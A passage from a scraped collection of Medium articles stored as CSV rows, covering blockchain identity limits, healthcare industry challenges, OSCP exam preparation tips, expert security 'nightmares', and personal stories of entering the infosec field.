Importantly, if trust in the proper ownership of the identity is predicated on the public-private key pair and the reputation of the pair to the claimed identity over time, then what happens if the user loses their phone/private key or gets a new phone? (Note: in most cases the user’s private key will be their phone). Of course, they will need to start over, to go back through identity proofing — validation, resolution, and verification — from scratch in order to claim their identity on the blockchain again as the owner of the private key that represents the identity. While legitimate users will need to re-bind authenticators to their identity in such cases, criminals will certainly exploit these account recovery pathways to take over identities because they can bypass the trust and tenure of the established login.
If there are multiple identity providers present as there most certainly will need to be, then standardization (see below) and fraud prevention (see above) become critical to ensuring the identity provider with the weakest proofing doesn’t become a vector to identity takeover on the network.
These problems will hold regardless of whether the network runs on blockchain or without it.
Demographic Challenges
Blockchain does little to address the demographic challenges associated with issuing strong digital credentials at scale. Identity proofing and authenticating different groups like students, seniors, rural Americans, the homeless, millennials, and young professionals is an incredibly varied and complex challenge. Younger consumers do not typically have a financial history, they very well might be on their parents utility bill, and they may not have a significant government records trail for the same reason. So, while they might have lots of sensors and know how to use Touch ID and a facial biometric to authenticate, the identity validation of their static personal data is very difficult, one reason why most synthetic identity fraud targets younger Americans. Seniors tend to have the opposite challenge — validating and verifying the identity is easier — but older Americans tend to be less computer literate and to have fewer devices that would help them authenticate. Rural Americans have similar characteristics.
Because identity proofing and authentication are prerequisites to access the blockchain or to conduct a transaction, the blockchain does not solve the fundamental issue of trust or access that is necessary to grant the individual access to use their identity or, as noted above, to even verify that the identity is real and not synthetic. Additionally for data schemes where personal information is store on a smartphone rather than server side, the approach presumes that the individual has a smartphone and is capable of using that smartphone to transmit information. That is before getting into scenarios where devices are shared across multiple members of a household or community.
Identity federation has long held the promise of tying strong authenticators, like a password plus a biometric plus a device, to static bundles of personal information, like a Name, DOB, and SSN, so that the authenticators (the digital login), not the static information, is trusted to represented the identity. Protocols like SAML 2.0 and OAuth 2.0 which significantly predate block chain already enable encrypted assertions and JSON tokens respectively to facilitate sharing of information while RESTful APIs could authenticate a claim — such as a hash of an identity — rather than sharing the raw personal data itself.
Standardization
Identity is fundamentally about trust in a given transaction: will you repay this loan? should I let you board this airplane? do you have enough credit to pay for this good or service? are you eligible for a student discount?
So, it is ironic that many efforts to collaborate on identity proofing in the public and private sector have largely come to naught because organizations don’t trust one another. Almost all regulated entities require their customers to create a login with them directly, to enter PII with them directly, and they then verify and validate that PII themselves directly with a data broker. This process could potentially happen multiple times in a day with the same vendor verifying the same person’s identity at different financial institutions or government websites.
There is no common sense explanation for why there is so much redundancy — and therefore additional friction — in the market prior to blockchain but there are a few reasons why most organizations don’t share data across the industry.
a) Large organizations view identity as a moat around their business. Sharing an individual’s data across organizations removes friction (i.e. it lowers switching cost) and if you are a large financial institution, the LTV of a customer dramatically outweighs inefficiencies in identity. Put another way, if you are JP Morgan Chase, why would you make it easier for your customers to open up a financial product at Citibank?
b) Many organizations do not trust other organizations to follow processes and procedures that they deem acceptable i.e. you might hear “that process might be fine at Bank of America but it would not cut it here at Capital One” (and vice versa). In most cases, this rationale is unwarranted — a byproduct of a phenomena called Illusory Superiority, like when 80% of American drivers believe they are above average drivers — but, in some cases, like the 2016 Wells Fargo scandal tied to two million false account opening, the fears are justified. And the fines that regulators can impose are substantial as well.
c) The demographic challenges of identity proofing and authentication make standardization of credential issuance difficult.
d) Lost authenticators requires re-verifying the identity back to the network.
e) There is no legal framework to control liability at scale if something goes wrong.
In short, the largest banks and telecoms — the natural identity providers for the online world — would need to accept a lot of risk, potential liability, and uncertainty in order to participate in an identity ecosystem. Executives generally don’t get fired for not sticking their neck out. They do get fired for trying something at scale and failing publicly.
And senior executives would be taking potentially enormous, short-term risk by sharing or validating personal data. After all, who is responsible if a hospital system allows a user remote access to medical records by trusting a banks’ KYC process — even if they just check a hash — only to find the user was a criminal impersonating the patient to obtain sensitive information they could then use to blackmail them?
Rules of the road for “identity chargeback” don’t exist yet.
The rewards are clearly substantial if a shared authentication system works, but the potential downside is so large that there are substantial personal and organization disincentives to sharing customer PII via any protocol or method be it raw data via SAML 2.0 or OAuth 2.0 or a hashing/claim validation scheme via blockchain or an API. As with most networks, no one wants to be first when the value is lowest and the risk greatest. Free riding is easier.
Blockchain doesn’t do a whole lot to change this dynamic.
Summary
Blockchain clearly provides massive utility, particularly concerning use cases that involve ownership of commodities, assets, and currency. However, digital identity and authentication are, for the most part, layers and steps that precede the blockchain application layer. Separating the steps is important to further a more informed and nuanced discourse amid all the hype.
Written by
","['Blockchain', 'Identity', 'Cybersecurity', 'Kyc', 'Authentication']"
5 Major Challenges Facing the Healthcare Industry in 2019,https://medium.com/@MailMyStatement/5-major-challenges-facing-the-healthcare-industry-in-2019-60218336385f?source=tag_archive---------6-----------------------,"Healthcare is facing rapid changes. Here’s what you need to know to stay ahead in 2019 and beyond.
The healthcare industry is facing many changes that pose new challenges to healthcare organizations big and small. In particular, the fast-evolving government regulations, technological innovations, and patient expectations create a new environment in which running a medical practice isn’t just about treating patients anymore.
Looking into 2019 and beyond, here are five major challenges faced by the healthcare industry and how to stay ahead:
Due to the highly sensitive patient information collected by healthcare organizations, the industry has become a prime target for cybercriminals. In 2017, the US medical and healthcare sector experienced over 350 data breaches, exposing 4.93 million patient records.
Image Source
This trend will continue as many healthcare providers are still slow in responding to threats while the decentralized systems make them more vulnerable to attacks.
When a breach occurs, not only are you compromising confidential patient information, but you also face a hefty penalty if you’re found to have violated the many compliant standards regulating the industry.
Besides improving cybersecurity, healthcare providers can also outsource their processes involving sensitive patient information such as invoicing and billing to a HITRUST-certifiedthird-party provider which has dedicated resources to ensure that its system is properly protected against cybercriminals.
Collecting payment has become more challenging as patients are becoming responsible for a larger portion of their medical bills. If you want to increase the speed and amount of your collections, you shouldn’t make your patients jump through hoops.
To meet patient expectations and improve the user experience, make sure your billing statements are patient-friendly. You should offer paperless statements and a variety of payment options (e.g., eCheck, credit card, etc.) via an online patient portal and utilize the latest payment technologies, such as mobile and text-to-pay.
However, it’s often challenging for medical practices to set up such invoicing and payment processing systems in-house. Not only do they have to negotiate terms with each payment processor and build the infrastructure (e.g., patient portal, secure payment processing) but they also must absorb the ongoing administrative cost of maintaining such technologies.
Additionally, healthcare providers are required to follow strict guidelines to protect patient information. You need to ensure that your payment portal and processing system are fully compliant, or you risk incurring a hefty penalty.
The medical insurance landscape has experienced some significant changes in recent years. As more patients are responsible for a larger portion of their healthcare bill, they naturally demand better services from their providers.
Healthcare organizations will face tougher competition in attracting and retaining patients who demand an experience that matches the level of customer service they expect from other consumer brands.
They demand a streamlined patient experience so they can “self-service” to resolve most questions, issues, or concerns (e.g., downloading an immunization record, booking an appointment, paying their bills, or checking their account/insurance status) whenever, wherever, and however is most convenient for them.
For healthcare organizations offering a variety of services in different locations, it’s also important for every employee to have access to the most up-to-date patient information from one centralized location. Not only will it deliver a better patient experience (who wants to tell their story from the beginning every single time?) but also help avoid fatal mishaps such as drug interactions.
To create an outstanding and streamlined user experience, you need to create a patient portal that keeps all the patient interactions in one place. It also allows all your employees to access each patient’s history — which is updated in real-time — from one centralized record to avoid costly mistakes.
Image source
In order to reduce cost and increase service quality, there’s now a trend toward determining financial incentives based on patient outcome rather than service quantity.
Payers and patients are demanding new payment models — such as bundled payments, disbursement to patient-oriented care providers, global payments, and shared savings — that encourage care providers to coordinate services and promote preventive care.
However, there are many challenges in implementing these new models and monitoring the processes within the existing systems. For example, new metrics need to be defined to measure performance and ROI.
Healthcare providers should pay close attention to the development of this trend. Look to early adopters and large organizations (e.g., Medicaid) who are testing and fine-tuning these new payment models to understand how best to reduce cost and improve patient outcomes while staying profitable.
Although more and more healthcare data is being generated, it’s scattered across multiple parties and systems including payers, providers, and patients. There’s no single “source of truth” that providers can use to optimize patient experience.
For instance, when patients switch insurance plan or healthcare provider, most medical practices rely on patients’ self-reporting to reconstruct their records. As a result, not all the information is transferred properly and it’s very challenging to harness the power of data and generate accurate insights.
In addition, healthcare data comes from many sources in a variety of formats. Currently, there’s no single system or technology infrastructure to retrieve, store, and analyze data from various sources at scale.
For healthcare organizations to successfully harness the power of big data, leadership needs to embrace data-driven decision-making. The use of analytics should be woven into the organization culture to develop a trust in data so the insights can be used to support decision-making at the executive level.
In order to fully leverage all the patient data from a variety of sources, healthcare organizations need to implement non-relational information technology so data from various sources can be utilized even if the datasets come in different formats.
To lower your administrative cost, minimize costly errors, and improve patient experience, you can use a HITRUST-certified third-party provider to handle patient statement design, invoicing, and payment processing.
MailMyStatements has you covered. We’ll handle everything you need to improve your billing, invoicing, and payment processing so you can deliver the best-in-class patient experience. In addition, we’re HITRUST-certified, which means you can rest assured that you’re staying compliant with the latest industry guidelines at all times while protecting sensitive patient information. Get in touch to see how we can help.
Hugh Sullivan is the CEO of MailMyStatements, an industry-leading healthcare billing, and payments company. He has over 25 years of experience as a seasoned healthcare executive, was the co-founder of ENS Health — a highly successful national healthcare electronic data interchange company, and has served in various leadership roles within Optum, a UnitedHealth Group company. Considered as an industry thought leader, Hugh is an expert in using health IT to improve healthcare information exchange, which can enhance the quality of care, improve efficiency, and reduce costs.
#PatientStatements
You can follow Hugh on Twitter @hughdsullivan
Written by
","['Healthcare', 'Patient Collections', 'Patient Engagement', 'Cybersecurity']"
5 Tips for OSCP Prep - InfoSec Write-ups - Medium,https://medium.com/bugbountywriteup/5-tips-for-oscp-prep-76001cdf4f4f?source=tag_archive---------6-----------------------,"Many OSCP write-ups focus on discussing the time spent in the PWK course and labs. I spent a significant amount of time preparing for this course before enrolling and I was able to pass the exam with only 30 days of lab access. Feel free to skip past the following section and check out the 5 tips that prepared me the most for this course!
I first heard about OSCP two years ago and knew it was something I wanted to achieve. There was something unique and fascinating about the format: A 24hr exam. Completely practical — no multiple choice questions. Limited use of automated tools. This all sounded extremely challenging. And it was!
Receiving the coursework was daunting as it all floods in at once: Lab access, the 380 page textbook, and the hours of videos. I was able to knock out the PWK course along with roughly 90% of the exercises within the first week. During the coursework I was reverting boxes in the network and running intensive scans after their services came back up.
After completing the course materials, I proceeded into the lab now having a full list of scanned hosts. I spent the next couple of weeks popping boxes and documenting my processes, refining my workflow, and honestly getting used to interacting with some of the older systems and services. During my last week of lab access, I went over my lab report to ensure I hadn’t missed anything. My final report was 198 pages — primarily due to including large, readable screenshots and code snippets!
Following my 30 days of lab access, I used my exam attempt to assess my readiness to complete this course. My strategy was to start on the buffer overflow machine while I scanned the other 4 hosts then knock out one of the easier boxes. This plan combined with my lab report would give me over half the points to pass with plenty of time left to gain the other points I would need to pass the exam.
I rooted the BOF box, an easier box, and had user on two of the medium boxes within within 9hrs of the exam. I struggled and was unable to follow manual privilege escalation routes on either of my medium boxes which should have pushed me into a passing grade.
Discouraged from the initial exam attempt but overall happy with my performance given the tough selection of boxes, I chose to schedule a second attempt and hope for different medium hosts! I spent the time leading up to my second attempt rooting a couple of retired windows HackTheBox machines and staying sharp on my overall process and workflow.
My second exam attempt went smoothly and I managed to root both medium boxes. After those machines, I had more than enough points to pass including my lab report and I chose to forego the hard machine in order to complete my 39-page exam report while I still had VPN access. I completed the exam and submitted my report within 20hrs.
HackTheBox has been such an amazing resource for hands-on learning and I don’t think I would have been able to prepare or construct a workflow that applied to PWK/OSCP without this. IppSec’s videos on retired boxes are excellent and pair well with the DIY approach to learning that HackTheBox offers. I learn new, invaluable tidbits of information from each of his videos as well as alternative ways to solve some of the problems I had encountered with boxes I had rooted before they were retired.
Georgia Weidman’s materials are fantastic resources for easing into the material covered in PWK at your own pace. She offers a free course on Cybrary which goes hand-in-hand with her book. This material is highly recommended if you would like to take a step beyond reviewing PWK’s syllabus but don’t feel ready to enroll in the course quite yet.
Like many, I was intimidated by the idea of writing a buffer overflow from scratch which is required in both the course and the exam. I sought out many resources and this one helped me wrap my mind around this topic the most. Justin includes a vulnerable binary as well as reading material which explain his process and workflow which translated perfectly into the buffer overflow portions of the lab and exam.
If there was just one takeaway from his methods that I recommend looking into it is how he automated the identification of bad characters using Mona modules in Immunity Debugger! This is by far the most sophisticated method I have been able to find and helped keep me sane during the practice sessions leading up to PWK as well as in the course exercises and during the exam.
Georgia Weidman’s coverage of WarFTP and Vulnserver were also great practice tools for getting comfortable with this topic.
These are great groups to discussing ideas, find motivation, avoid burnout, get advice on challenges, as well as answer questions regarding the course material. These are not a place for spoilers but are often a platform to talk out an idea or train of thought and communicate with fellow students in near real-time. I gained a lot from these communities.
A small practical tip I’ll include is a handy tool called onetwopunch which helped knock out a lot of the mundane scanning in the large lab network with impressive accuracy. This tool uses unicornscan to quickly scanning every TCP and UDP port on a host, then passes open ports to nmap which you can specify flags with. I used this to run my scans on both the lab and exam networks with ease and accuracy.
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Hacking', 'Cybersecurity', 'Pentesting', 'Infosec', 'Certification']"
6 information and cyber security nightmares—and how to prevent them,https://medium.com/pluralsight/cybersecurity-nightmares-aa9aa3110436?source=tag_archive---------9-----------------------,"In today’s Internet of Everything world, we’re more connected than ever before — which means more opportunity for security threats and data breaches. And 2017 has been quite the year for them. Think Equifax, Wikileaks, WannaCry, Chipotle…. the list goes on.
Since October is National Cyber Security Awareness Month (NCSAM), we asked our in-house experts and the security-savvy Pluralsight author community what their biggest security nightmares are, and more importantly, how to prevent them. Here are just a few scary stories to teach you a thing or two about security.
When it comes to security threats, I believe that the biggest damage caused to people will continue to be the ever-increasing amount of ransomware. It’s quite easy to block traditional malware by using whitelisting techniques like Windows AppLocker, but it is very hard to prevent people from damaging their own or shared data.
Solution: Since anti-malware is basically useless against the hundreds of thousands of new samples found every day, you must adopt proactive measures like PoLP (principle of least privilege), whitelisting and network authentication to stay safe. From my perspective, the most common ways that companies get hacked are still somehow related to social engineering or people neglecting to read instructions. For that, the only fix out there is training and increasing awareness.
- Sami Laiho, Pluralsight author
I’ve had a lot of security nightmares, but the worst is related to passwords — specifically bank passwords. What happens when a hacker gets a password to a company’s ETF’s FTP account? Bad, bad things — the hacker extracts account numbers and personal information about the bank’s clients. You guess the ending of the story.
Solution: Employee awareness training.
- Gus Khawaja, Pluralsight author
My biggest nightmare is that the trend of ever increasing data breaches — increasing in both frequency and size — continues on. Oh sure, medical devices being exploited and IoT going wrong to the extent that it hurts people en masse is all very scary, but the reality that hurts us most is the billions of records we see flooding the internet. My biggest nightmare is the continuing reality.
Solution: My courses and Pluralsight’s other security training are a great start. These sites are very frequently compromised by vulnerabilities built into the code of the site, and the best way we can fix this is to educate developers and stop building vulnerable code in the first place.
- Troy Hunt, Pluralsight author
My biggest nightmare is when I meet with IT teams and they tell me they’re secure because they have an IDS, Anti-Virus and proper firewalling across their networks and devices. Yet, they’ve never looked at the logs or don’t know where their most risky data is and how people can access it. Or even worse — don’t even know what they have, if they have policies, and no documentation.
Solution: We need to make sure we’re educating our IT teams on the threats that are present and the risk data holds. And, at the same time, we need to implement security procedures into the culture of the team and company, and regularly review/test those procedures. Security isn’t a add-on or an afterthought — it needs to be a core focus that is part of the IT team’s thought process throughout the development and administration lifecycles.
- Gary Eimerman, Pluralsight VP of Content Production
Beyond the evil clown craze, I’d have to say that wireless is the scariest thing as of late. We’re all addicted to our wireless devices, be it smartphones, tablets, TVs or gaming consoles. Even doorbells, dishwashers, cars and refrigerators are coming with wireless built into them. And my concern is how wireless works. We’re becoming a generation of “I don’t care how it works, as long as it works.” And that’s scary.
Even if you’re using secure encryption like WPA2, you’re not “totally secure.” Want to hear a scary story? Did you know that I can reset your connection on your device and pick up the handshake you make with your wireless router/AP? All I have to do is run that handshake through a quick dictionary attack tool and if your wifi password is weak (a weak password equates to using passwords that are made up of less than 14 characters and are based on real words), I’ll be trick-or treating all over your network.
Solution: Make sure your wifi passwords are STRONG. The second thing you can do is not “automatically connect” to the wifi access point. I know it’s convenient, but any time we look at security and convenience is involved, you’re losing your security posture. I know it means two or three more clicks, but that’s nothing compared to being subjected to an evil clone attack! (Hey wait a minute…evil clown, evil clone…hmmmm).
- Dale Meredith, Pluralsight author
As a CTO, my biggest security nightmare is when we, as technology pros, miss something obvious. When we overlook something like cross-site scripting or injection vulnerabilities, it’s easy for someone to gain access to sensitive data that could potentially shut down your entire site and result in serious, ongoing consequences. In today’s hyper-connected world, EVERYONE is at risk to get hacked at some point. But, as a company that provides technology training, specifically security training, we need to be sure we don’t miss those obvious and also not-so-obvious things.
Solution: Some obvious things companies should do to protect themselves are create awareness within the org and provide training for your teams. Also, conduct third party penetration tests and share the results within the organization — this can really highlight the risks and bring them home for people.
- Jody Bailey, Pluralsight Chief Technology Officer
These security stories aren’t meant to scare you—they’re meant to inform you. Let’s stop looking at security as something you should be scared into doing, and something you should do because you care.
In the words of Don Jones, Pluralsight’s Curriculum Director for IT Ops Content:
“Security isn’t scary — it’s a lifestyle. Security isn’t something you do from fear. Security is something you do because it’s your job. Because it’s the right thing to do. You don’t protect your children because you’re scared of something — you protect them because you love them, and because it’s the right, natural thing to do. So love your infrastructure. Love your career. Get your InfoSec ducks in a row because it’s the right thing to do.”
On that note, see how your security skills stack up with this free assessment: Security for Hackers and Developers, and join the conversation on Twitter with #NCSAM and #CyberAware.
Written by
","['All stories', 'Cybersecurity', 'Technology', 'Data Breach']"
7 Awesome Skills That Will Make You Stand Out As A CyberSecurity Pro,https://medium.com/@marcoessomba/7-killer-skills-that-will-make-you-stand-out-as-a-network-security-engineer-5131e6c18f12?source=tag_archive---------8-----------------------,"Originally published at www.linkedin.com.
Are you an IT Graduate or Network Security Engineer looking to enhance your career and stand out from the crowd? This article is for you.
I have been in the network & security space for more than a decade. As a network security engineer, security consultant, and now Founder & CTO at iCyber-Security Group, these products have served me well over the years in order to rise above the crowd.
Note that the list below is not sponsored or endorsed by those vendors. It is drawn from my own past experience and it is by no means the absolute truth. I am biased to the extent that I have grown to love those products over the years.
Happy learning!
— — — — — — — — — — -
Let’s connect: Marco Essomba
About The Author: Marco Essomba is a network & security expert, with more than a decade of experience in the field. He founded iCyber-Security Group, a world class cyber security firm that provides state of the art Application Delivery Networking and security solutions to clients in banking, retail, finance, and insurance.
Twitter: @marcoessomba
Website: https://www.icyber-security.com
Medium: https://medium.com/@marcoessomba
LinkedIn: https://uk.linkedin.com/in/marcoessomba
— — — — — — — — —
Written by
","['Cisco', 'GNS3', 'virtual appliance.', 'Sourcefire', 'here.', 'here.', 'Clearswift', 'here.', 'F5 Networks', 'here.', 'RSA', ' here', 'Linux/Unix', 'Ubuntu', 'Network Security', 'Graduate', 'Skills Development', 'Cybersecurity', 'Cyber']"
7 Surprising Ways People Became Infosec Professionals,https://medium.com/hackernoon/7-surprising-ways-people-became-infosec-professionals-3a6596032a5a?source=tag_archive---------9-----------------------,"If you enjoy this article, help a non-rich cybersecurity woman out… Please click on the little green heart to recommend my article!
In writing about information security since 2009 for various publications, I’ve had the privilege of meeting a lot of fascinating people in my field. A lot of us come off as paranoid. We’re all weirdos in our own ways. Some of us are very friendly, and enjoy making conversation with new people. There are a lot of white men in information security, but there are also people of a variety of races, ethnicities, and nationalities. I’ve also met a number of other women. I enjoyed interviewing some of us for Tripwire’s corporate blog. I even met one information security professional who is transgender- a nonbinary femme.
One thing that has intrigued me for a while is the plethora of interesting ways we’ve gotten into infosec. There’s no set path, and everybody’s story is different! Our various different backgrounds give each of us a unique perspective which enhances how we think about vulnerabilities, security hardening, and cybersecurity culture in general.
Kim Crawley (me!)
I started using Windows 3.1 in 1993 at nine years old. My father bought our very first IBM PC with an Intel 486 processor- a powerful PC for its time. As a little girl, I explored his PC thoroughly. I loved playing around with Windows and MS-DOS. I had a number of favourite games published by Apogee, Sierra, Broderbund, and Epic MegaGames for MS-DOS. I even learned some DOS commands.
Dad was a novelist, and he frequently had technical issues. They were usually to do with his laser printer, or general Windows problems. He let me fix his peripheral issues, and I also edited autoexec.bat so that Windows would boot quicker. It’s amazing how he recognized my computer literacy even though I was a little girl.
By 1994, the Crawley household got internet access for the first time, via Prodigy Online and a 14,400 bps modem. I surfed early webpages on the World Wide Web with the Mosaic browser. I’d look at the source code of webpages to teach myself some HTML.
Although I was interested in computers from an early age, the rest of the world seemed to try to dissuade me from a computing career. My math at school wasn’t excellent, and my teacher told me that you have to be a math whiz to work in computing. She had never pursued computer science or IT, what the hell would she know? But as a child, I didn’t question her. It also didn’t help that depictions of “computer nerds” in the media were always male.
Fast forward to my mid twenties- at that point I had experience making websites for people. I still didn’t consider myself to be good with computers for some reason. But I had a now ex-boyfriend who thought that I had a lot of potential. So I went on to get my first CompTIA certs; A+, Network+, and Security+. That enabled me to get a job in tech support.
In my tech support job, I noticed that a lot of tickets were malware related. Malware started to fascinate me. People have always told me that I’m good with words. My late father was a significant factor in my learning how to write effectively and for commercial purposes. By 2009, a friend of a friend helped me get a gig writing articles for InfoSec Institute’s InfoSec Resources website. I really cut my teeth there, and I wrote infosec articles for them for years.
Back in August 2014, Gamergate hit. It was a tiring online hate campaign that ended up targeting many women and LGBTQ people (and those who defend them), after starting with an attempt to destroy game developer Zoe Quinn. There were hundreds of targets, and they tended to be in the video game industry, in computer science and information technology, and in social justice activism. Gamergate was a nasty example of the absolute worst of human nature, that developed into a massive online attack mob. The mob largely consisted of ignorant and hateful young men, driven by reactionary rage. Slut shaming, homophobia, transphobia, Islamophobia, racism, trying to gatekeep video games as a He-Man Women Haters’ Club (fictional women like Vivian James exempted), harassing video game reviewers for giving Call of Duty games scores of less than 10 out of 10… it was a clusterfuck.
It’s a long complex story, and it was a phenomenon that was created by the same sort of nasty bigots who helped get Donald Trump elected as President of the United States. Actually, a Venn diagram of Donald Trump’s fans and Gamergaters would overlap considerably. If this is the first time you’ve heard of Gamergate and you’d really like to learn more for the sake of context, RationalWiki has an excellent, relatively concise synopsis here.
By February 2015, Gamergate was still going strong. A lot of Gamergate harassment campaigns and script kiddie grade cyberattacks were being planned on 8chan. 8chan started because 4chan stopped allowing really horrible and bigoted content. 4chan’s admins decided to stop allowing Gamergate related posts. 8chan’s founder, Frederick “Hotwheels” Brennan, had already allowed its forums to become a venue for child pornography distribution. He needed more traffic, more buzz! So he welcomed Gamergaters who were furious about being banned by 4chan with open arms.
Gamergate’s primary weapon was the internet. They used computer technology to try to ruin people’s lives. Many of their actions were cyber attacks, however amateur and script driven. SWATing is when a prank phone call, email, or other sort of communication is sent to a police department in an attempt to send a SWAT team to a target’s home and terrorize them. SWATing was a popular activity amongst some Gamergaters. Other ‘gaters liked doxxing. That’s when sensitive information about targets, such as phone numbers, home addresses, credit card numbers, and SSN numbers, are distributed online to facillitate an attack. All of that bullshit falls under the umbrella of information security.
So that month, I wrote an article about Gamergate and 8chan for InfoSec Resources. They published it. Within hours, Gamergaters found my article and were outraged. They organized a harassment campaign to get my article offline. They couldn’t find my email address (as an information security journalist, I know how to make myself difficult to dox) or phone number. But they found various email addresses connected to InfoSec Resources. They organized on 8chan and Reddit, and hundreds of harassing emails were sent to InfoSec Institute employees, including my cowardly former editor Robert Rodriguez. I soon received an email from him that informed me that my article was taken offline. (Here’s a web cache if you’re curious and want to read my article. Thank you, archive.is!) Then they took all of my articles offline, because obviously angry 8channers are a primary market for InfoSec Institute’s training programs.
Robert Rodriguez and InfoSec Institute deserve my calling them cowardly. Already media corporations like newspapers and television networks are being purchased by a smaller number of ever growing big corporations. Journalism professors are bemoaning that too much journalism is becoming glorified PR and advertising because of growing corporate influence. Investigative journalism is a crucial public service in the Information Age. How are people supposed to learn about problems in society and the world at large if not for investigative journalists and various whistleblowers? A lot of the best information security journalism is investigative and controversial.
I wrote about Gamergate as an information security problem, and InfoSec Institute decided to let the blackhats that cybersecurity professionals are supposed to help protect people from win. I also contributed content to their CISSP and Certified Ethical Hacker training programs without ever having either certification. Seriously, if you’re in infosec and need a training program, try SANS Institute because their good reputation is deserved. Don’t waste your money with InfoSec Institute.
Anyway, during the years I wrote for InfoSec Resources, Rodriguez got me opportunities to write for IDG publications CSO, CIO, and Computerworld. I also got to write for SC Magazine. Feel free to check out the links to read more of my work.
I’m really proud of my article that was published in 2600 Magazine’s Winter 2014/2015 issue. It’s titled “What Do Ordinary People Think A Hacker Is?” Unlike my articles for other publications, I wasn’t paid with money. But being in 2600 is prestigious in some tech circles and I enjoyed my free one year subscription. I think I’ll write something else for 2600 in 2017. Here’s some interesting trivia. I was born in January 1984, the month that 2600 Magazine debuted.
Being a Gamergate target took a tremendous emotional toll on me. It felt like my infosec writing career was over, and I was only 31 at the time. I fell into a deep depression that lasted for months. There were weeks when I only left my bed to use the toilet and shower.
But like the almighty Phoenix, I rose from my ashes. I made a lot of friends in the infosec community, and there were people out there who liked my writing. Thanks to connections I made over the years with infosec people on Twitter, new opportunites came my way. I made friends with other infosec publication editors who saw potential in me.
Joe Pettit of Tripwire got me published, starting with my Women in Information Security interview series, which debuted in October 2016. I went on to write articles for Tripwire’s blog on quantum networking, and personal data in consumer devices. There are more Tripwire articles to come!
Kate Brew of Alienvault enjoyed my writing for Tripwire, and asked me to contribute to their corporate blog. My first article for Alienvault is about how poor UX design is a growing information security problem. She’s excited about some of my other ideas for Alienvault blog articles, so I’m working on them!
I’m also proud of having presented at my first infosec convention last year, BSides Toronto 2016. I keep my t-shirt with pride.
Follow me on Twitter: @kim_crawley
Brian Krebs
Well known security researcher Brian Krebs’ story stands out in my mind. His background wasn’t in computing. He worked for The Washington Post as a reporter since 1995. He describes how he got into infosec as an accident. In 2001, his home LAN was hit with the Lion Worm.
Krebs did some computer programming as a kid, and has always been interested in computing, even though he didn’t pursue it professionally at the time. His natural curiousity led him to explore what the worm did to his computer and his network. That triggered an ongoing fascination with information security.
He went on to write the Security Fix blog for The Washington Post. That venture evolved into his current Krebs On Security blog. All of his research and writing through the years has made Krebs a sought after information security expert.
Follow Krebs on Twitter: @briankrebs
Rick McElroy
McElroy’s love of computing started as a child. He took apart an Atari video game console to explore its inner workings. As a teenager, he was in a high school program called NORSTAR which was all about robotics and computing. An experiment he worked on in NORSTAR ended up on a space shuttle thanks to a partnership with NASA! Those experiences fueled his love of technology ever further.
At only 17, he enlisted in the United States Marine Corps. He wasn’t in a computer technician role, he describes his position then as being a “grunt.” There were few computer tech job opportunities in the Marines, so eventually he decided to start an IT career as a civillian.
He attended Coleman University to pursue his dreams. While there, he learned everything from networking to how to build servers from hardware components.
After graduating, he found employment with a company that sells computer hardware and services to businesses. They also employed some cybersecurity professionals whom he learned a lot from. They taught him about penetration testing, security hardening, and how to sell those services to business, explaining the importance of information security to those clients.
That’s what kickstarted his infosec career, which has been growing strong for over seventeen years. He wrote an excellent article on why military veterans make excellent cybersecurity professionals for ITSP Magazine.
Follow McElroy on Twitter: @InfoSecRick
Kat Sweet
Military veterans have unique knowledge and experience that can enhance an information security career. But so can… women and gender studies students? Yep!
That’s what Sweet studied. Her experience sharpened her critical thinking skills, and gave her an in-depth understanding of how power structures work in society.
A cybersecurity professional I once knew said, “Amateurs hack systems. Professionals hack people.” STEM (science, technology, engineering, and mathematics) backgrounds relate to infosec in an obvious way. But people often overlook how psychology, sociology, and other social sciences are crucial to infosec. Most cyberattacks involve social engineering at some level- fooling people. Also, end user ignorance is often a security vulnerability, as are factors such as how poor corporate culture and worker exploitation drive internal attacks, and poor UX design.
Sweet went from school to working in politics. She worked on political campaigns, as a page, and then as a legislative aide. She learned that politics can be an unstable field to work in, even if you aren’t a politician who depends on re-election to keep their job. People who work for politicians can also have unreliable job security. Staffers often lose their jobs when the politican they work for loses an election, too.
Wanting to leave politics, Sweet’s natural curiosity led to her teach herself computer programming. Secure software engineering and design is a key area of infosec. Security fascinated her, so she explored it further. She went on to attend infosec conventions, volunteer for them, and speak at them. She didn’t entirely feel like she belonged in the infosec world, but watching a presentation at DerbyCon 2014 about how people can enter security from areas outside of computer science and information technology convinced her otherwise.
Last year, she got her first proper infosec job, and the industry is all the better for her contributions.
Read her fascinating story on her blog here, and here. I also had the honour of interviewing her for my Women in Information Security series.
Follow Sweet on Twitter: @TheSweetKat
Claus Cramon Houmann
Houmann studied Business Adminstration and Information Technology at a college in his native Denmark. While in business college, he worked for Denmark’s largest ISP as an ADSL hotline supporter. When he graduated, he was hired as a process consultant at TDC Hosting.
That got him lots of experience interfacing with datacentres. Learning on the job by working with firewall configuration, and physical access controls for server rooms got his feet wet for infosec, even while his focus was on availability and logging.
Datacentre metrics back then may have focused on uptime and accurate data collection, but those ends are dependent on security. The CIA triad of infosec applied to Houmann’s work, even if he was unaware of it. Especially the Integrity and Availability components. Datacentres like the environments where he worked in are connected to networks, a means of accessing and distributing data from some computers to other computers. Often the networks datacentres are connected to include the public internet. Cyberattacks like DDoS attacks compromise availibility, and cyberattacks like man-in-the-middle attacks compromise integrity. Networking facillitates those sorts of attacks, and you don’t even need an internet connection. A rogue, disgruntled employee can attack their employer’s server within a WAN that’s closed to the internet, or an outside attacker can penetrate a workplace’s building to acquire the same physical WAN access an employee may have.
After working at TDC Hosting for a few years, Houmann’s employer got him into working with ITIL- AXELOS’ proprietary Information Technology Infrastructure Library system for IT service management. TDC Hosting provided him with specific training and certification study and exams. By the release of ITIL v3 in May 2007, security became a curriculum component, although Houmann says infosec has changed a lot since then. But having to learn ITIL v3 helped introduce Houmann to some security formalities.
Imagine how many more brilliant minds there would be in infosec if countries like Canada, the United States, and the United Kingdom were more like Denmark? Houmann benefitted from a Danish public service which allows Danish citizens to attend college and university tuition-free. Then he had an employer who was ready and willing to invest in his further education into specific information technology domains. There are probably millions of Canadians, Americans, and Britons with Houmann’s potential who’ll never work in infosec because they cannot afford the required education, and employers insist on $50,000 worth of education for apparently entry level positions.
Houmann then fell in love and got married. His wife found a job in Luxembourg, so he quit his Danish job to move with her. He started his own IT service management business in Luxembourg, ImproveIT Consulting. His largest client was a small banking institution which he realized was in great need of security management. Financial data is highly sensitive, and every developed nation on Earth has strict government regulations for keeping data secure in that industry!
